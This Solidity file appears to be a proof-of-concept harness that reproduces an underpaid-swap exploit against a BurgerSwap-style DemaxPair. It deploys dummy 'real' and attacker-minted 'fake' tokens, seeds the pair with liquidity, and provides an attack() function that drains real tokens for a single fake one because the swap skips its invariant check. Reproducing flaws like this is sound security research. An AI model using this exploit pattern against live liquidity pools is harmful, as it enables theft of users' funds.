// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./DummyTokens.sol";
import "./DummyRouter.sol";
import "./BurgerSwap.sol"; // Contains IDemaxConfig, IDgas, DemaxPair

/// @notice A "real" token used as the valuable asset in the pair
contract RealToken is ERC20Mock {
    constructor() ERC20Mock("Real Token", "RTKN") {}
}

/// @notice A "fake" token controlled by the attacker, with unlimited minting
contract FakeToken is ERC20Mock {
    constructor() ERC20Mock("Fake Token", "FTKN") {}
}

/// @notice Deployer sets up a vulnerable DemaxPair and provides an `attack()` entrypoint
contract Deployer {
    RealToken public real;
    FakeToken public fake;
    ConfigStub public config;
    DgasStub public dgas;
    DemaxPair public pair;

    constructor() {
        // Deploy dummy tokens
        real = new RealToken();
        fake = new FakeToken();

        // Deploy stubs
        config = new ConfigStub(address(this));
        dgas   = new DgasStub();

        // Deploy the pair (constructor sets FACTORY == msg.sender == this)
        pair = new DemaxPair();
        // Initialize the pair with our tokens, config, and DGAS stub
        pair.initialize(address(real), address(fake), address(config), address(dgas));

        // Mint and seed liquidity: enough to exceed MINIMUM_LIQUIDITY (1_000)
        real.mint(address(this), 20000 ether);
        fake.mint(address(this), 20000 ether);

        // Transfer into the pair and mint LP tokens
        real.transfer(address(pair), 1001 ether); // min for minting > 1_000
        fake.transfer(address(pair), 1001 ether); // min for minting > 1_000
        // As "platform", this contract may call mint
        pair.mint(address(this));
    }

    /// @notice Executes the underpaid-swap attack against the vulnerable pair
    function attack() public {
        // Mint a tiny amount of fake tokens
        fake.mint(address(this), 1);
        // Send to the pair
        fake.transfer(address(pair), 1);

        // Swap out real tokens without invariant check
        // Determine which side is the real token
        if (pair.token0() == address(real)) {
            // Drain token0
            pair.swap(1, 0, address(this), "");
        } else {
            // Drain token1
            pair.swap(0, 1, address(this), "");
        }
    }
}
